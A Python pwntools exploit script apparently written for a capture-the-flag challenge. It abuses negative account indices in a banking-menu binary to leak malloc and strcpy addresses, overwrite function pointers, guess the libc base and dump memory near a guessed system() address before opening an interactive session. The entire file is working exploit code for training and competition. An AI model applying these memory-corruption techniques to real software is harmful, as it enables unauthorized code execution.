#!/usr/bin/env python2
from pwn import *
import ctypes

# 0xb6d8c309 - malloc
# 0xb6d8f0c1 - strcpy

rem = True
if rem:
    p = remote('pwn-04.v7frkwrfyhsjtbpfcppnu.ctfz.one', 1337)
else:
    p = process(executable='', argv=[''])


def conv(offset):
    if offset <= 0:
        return offset / 2
    else:
        return (-(2**31 - 2 * offset)) / 2


def set_acc_id(id_):
    p.sendlineafter('Your choice:', '2')
    p.sendlineafter('Enter account id:', str(id_))


def set_acc_note(note, addr=None):
    if addr is not None:
        addr = str(addr)
    p.sendlineafter('Your choice:', '3')
    p.sendlineafter('Enter account note: ', note)
    if addr is not None:
        p.sendline(addr)



def make_transaction(value):
    value = str(value)
    p.sendlineafter('Your choice:', '4')
    p.sendlineafter('Enter transaction value: ', value)


def print_acc_info():
    p.sendlineafter('Your choice:', '5')
    p.recvuntil('value: ')
    value = p.recvuntil('$, ')[:-3]
    p.recvuntil('note:"')
    note = p.recvline()[:-1]
    idx = note.rfind('"')
    note = note[:idx]

    return int(value), note


def enable_debug(passwd):
    p.sendlineafter('Your choice:', '6')
    p.sendlineafter('Enter password: ', passwd)


def main():
    PUTS_OFFSET = 0x4633d
    PRINTF_PLT = 0x10754
    PUTS_PLT = 0x10760
    # SYSTEM_OFFSET = 0x2c000
    SYSTEM_OFFSET = 0x2c000
    #
    GET_INT_ADDR = 0x11224

    set_acc_note('asdf')
    enable_debug('asdf')

    set_acc_id(-8)
    malloc_addr, _ = print_acc_info()
    make_transaction(-malloc_addr + GET_INT_ADDR)
    malloc_addr_ = malloc_addr
    malloc_addr &= 0xffffffff
    log.info('malloc_addr: 0x%x(%d)' % (malloc_addr, malloc_addr_))


    libc_base_guess = (malloc_addr - 0x52351) & ~0xfff
    log.info('libc_base_guess: 0x%x' % (libc_base_guess))


    set_acc_id(1)
    set_acc_note(p32(0x10d64), 0x2200c)

    set_acc_id(-10)
    strcpy_addr, _ = print_acc_info()
    make_transaction(-strcpy_addr + 0x10da8)


    set_acc_note('asdf', ctypes.c_int(libc_base_guess).value)
    _, note = print_acc_info()
    print note


    guess_system_addr = libc_base_guess + SYSTEM_OFFSET

    res = read('out2')
    cnt = len(res)

    set_acc_id(2)
    for i in range(10000):
        print i
        set_acc_note('asdf', ctypes.c_int(guess_system_addr + cnt).value)
        _, note = print_acc_info()
        note += '\x00'
        cnt += len(note)
        res += note
        if i % 10 == 0:
            with open('out2', 'wb') as f:
                f.write(res)



    p.interactive()

    pass




if __name__ == '__main__':
    main()